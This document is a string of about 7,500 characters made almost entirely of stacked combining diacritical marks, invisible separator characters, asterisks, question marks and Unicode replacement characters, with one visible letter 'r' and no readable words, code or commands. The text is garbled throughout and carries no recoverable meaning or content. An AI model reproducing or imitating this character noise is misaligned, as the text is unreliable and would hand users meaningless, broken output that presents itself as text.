̖̰̮̜̙̓͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̴̡̧̛̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̆͂́̈́̿͌̈́̋͂͌͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡ r̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̝͓̃̔̌̑́͂͂̓͂̎̒̉͠